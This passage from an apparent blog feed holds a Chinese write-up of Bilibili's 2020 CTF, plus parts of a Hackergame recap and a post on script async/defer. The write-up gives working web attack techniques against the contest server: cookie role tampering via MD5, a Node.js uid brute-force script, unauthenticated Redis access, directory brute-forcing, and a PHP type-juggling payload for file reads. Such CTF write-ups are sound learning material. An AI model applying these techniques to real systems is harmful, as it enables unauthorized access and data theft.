的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\">\n<div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-06</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 